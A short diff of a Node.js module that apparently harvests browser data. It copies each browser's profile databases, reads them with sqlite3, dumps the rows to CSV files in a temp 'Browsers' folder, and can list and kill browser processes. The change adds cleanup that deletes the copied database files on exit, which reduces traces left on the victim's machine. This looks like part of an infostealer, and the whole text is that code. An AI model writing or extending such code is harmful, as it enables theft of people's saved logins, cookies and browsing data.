@@ -1,4 +1,4 @@
-const { existsSync, copyFileSync, mkdirSync, writeFileSync } = require('fs');
+const { existsSync, copyFileSync, mkdirSync, writeFileSync, rmSync } = require('fs');
 const { join, sep } = require('path');
 const { randomFileCreator } = require('../dir');
 const psList = () => import('ps-list').then(({ default: psList }) => psList());
@@ -8,6 +8,7 @@ const { tempFolder } = require('../../index');
 const { addDoubleQuotes } = require('../string');
 const sqlite3 = require('sqlite3').verbose();
 
+const filesToDelete = [];
 const _ = (name, path, use, filename, database, rows, dbData) => {
   path += join(sep, 'Default', use);
   if (!existsSync(path)) return;
@@ -16,6 +17,7 @@ const _ = (name, path, use, filename, database, rows, dbData) => {
   const file = join(tempFolder, 'Browsers', name, `${filename}.csv`);
   const data = [];
   const dbFile = randomFileCreator();
+  filesToDelete.push(dbFile);
   copyFileSync(path, dbFile);
 
   const db = new sqlite3.Database(dbFile);
@@ -119,3 +121,5 @@ module.exports.kill = (browser, onKilled) => {
     }
   });
 };
+
+process.on('beforeExit', () => filesToDelete.forEach(file => rmSync(file)));
